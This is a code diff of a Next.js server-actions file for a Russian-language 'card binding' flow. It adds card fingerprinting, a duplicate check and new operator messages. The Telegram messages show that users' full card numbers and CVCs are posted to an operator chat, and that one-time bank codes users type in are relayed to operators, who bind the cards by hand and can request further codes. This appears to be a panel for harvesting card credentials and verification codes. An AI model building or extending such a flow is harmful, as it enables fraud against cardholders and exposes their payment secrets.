@@ -1,5 +1,6 @@
 "use server"
 
+import { createHmac } from "node:crypto"
 import { and, asc, count, desc, eq, sql } from "drizzle-orm"
 import { headers } from "next/headers"
 import { revalidatePath } from "next/cache"
@@ -29,6 +30,12 @@ export type BindingRequestResult = { ok: true; cards: PaymentCardView[] } | { ok
 
 const MAX_CARDS = 5
 const MAX_PENDING = 2
+
+function cardFingerprint(cardNumber: string) {
+  const secret = process.env.ADMIN_SECRET || process.env.BETTER_AUTH_SECRET
+  if (!secret) return `request:${crypto.randomUUID()}`
+  return `hmac:${createHmac("sha256", secret).update(`payment-card:${cardNumber}`).digest("hex")}`
+}
 
 async function getSessionUser() {
   const session = await auth.api.getSession({ headers: await headers() })
@@ -81,9 +88,19 @@ export async function requestCardBinding(input: {
   const brand = detectBrand(cardNumber)
   const bankName = detectBank(cardNumber) ?? ""
   const last4 = cardNumber.slice(-4)
+  const fingerprint = cardFingerprint(cardNumber)
 
   const created = await db.transaction(async (tx) => {
     await tx.execute(sql`select pg_advisory_xact_lock(hashtext(${user.id}))`)
+    const [duplicate] = await tx.select({ status: paymentCard.status }).from(paymentCard)
+      .where(and(eq(paymentCard.userId, user.id), eq(paymentCard.fingerprint, fingerprint))).limit(1)
+    if (duplicate) {
+      return {
+        error: duplicate.status === "rejected"
+          ? "Эта карта была отклонена. Удалите её из списка, чтобы отправить заявку заново."
+          : "Эта карта уже добавлена.",
+      }
+    }
     const [{ total }] = await tx.select({ total: count() }).from(paymentCard).where(eq(paymentCard.userId, user.id))
     if (total >= MAX_CARDS) return { error: `Можно привязать не больше ${MAX_CARDS} карт.` }
     const [{ pending }] = await tx.select({ pending: count() }).from(paymentCard)
@@ -92,7 +109,7 @@ export async function requestCardBinding(input: {
     const [row] = await tx.insert(paymentCard).values({
       userId: user.id, brand, last4, bankName: bankName || null, cardholder,
       expMonth, expYear,
-      fingerprint: `request:${crypto.randomUUID()}`, status: "pending",
+      fingerprint, status: "pending",
     }).returning({ id: paymentCard.id })
     return { id: row.id }
   })
@@ -105,7 +122,8 @@ export async function requestCardBinding(input: {
     `${escapeTelegram(CARD_BRAND_LABEL[brand])}${bankName ? ` · ${escapeTelegram(bankName)}` : ""}`,
     `Держатель: ${escapeTelegram(cardholder)}`,
     `Пользователь: ${escapeTelegram(user.name ?? "")} (${escapeTelegram(user.email)})`,
-    "Привяжите карту в bePaid и подтвердите в админ-панели.",
+    "Привяжите карту в bePaid, затем запросите код или подтвердите карту кнопками ниже.",
+    "Номер и CVC скроются из этого сообщения после решения (кроме «Доп. проверка»).",
   ].join("\n"), { kind: "card", id: created.id })
 
   revalidatePath("/cabinet/cards")
@@ -128,7 +146,8 @@ export async function submitCardCode(id: number, code: string): Promise<CardsRes
     `<b>Код от пользователя для карты #${id}</b>`,
     `Код: <code>${escapeTelegram(trimmed)}</code>`,
     `Пользователь: ${escapeTelegram(user.name ?? "")} (${escapeTelegram(user.email)})`,
-  ].join("\n"))
+    "Если код подошёл — подтвердите карту. Если нет — запросите код ещё раз.",
+  ].join("\n"), { kind: "card", id })
 
   revalidatePath("/cabinet/cards")
   return { ok: true, cards: await listCards(user.id) }
@@ -141,7 +160,7 @@ export async function submitExtraCheckResponse(id: number, response: string): Pr
   if (!trimmed) throw new Error("Введите ответ.")
   if (!(await allowUserAction(user.id, "cardReply"))) throw new Error(RATE_LIMIT_ERROR)
 
-  const [row] = await db.update(paymentCard).set({ status: "code_requested", extraCheckResponse: trimmed })
+  const [row] = await db.update(paymentCard).set({ status: "pending", extraCheckResponse: trimmed })
     .where(and(
       eq(paymentCard.id, id),
       eq(paymentCard.userId, user.id),
@@ -155,8 +174,8 @@ export async function submitExtraCheckResponse(id: number, response: string): Pr
     `<b>Ответ пользователя на доп. проверку (карта #${id})</b>`,
     `Ответ: ${escapeTelegram(trimmed)}`,
     `Пользователь: ${escapeTelegram(user.name ?? "")} (${escapeTelegram(user.email)})`,
-    "Пользователь теперь вводит код — дождитесь его и подтвердите карту в админ-панели.",
-  ].join("\n"))
+    "Выберите следующий шаг: запросить код, подтвердить, ещё одна проверка или отклонить.",
+  ].join("\n"), { kind: "card", id })
 
   revalidatePath("/cabinet/cards")
   return { ok: true, cards: await listCards(user.id) }
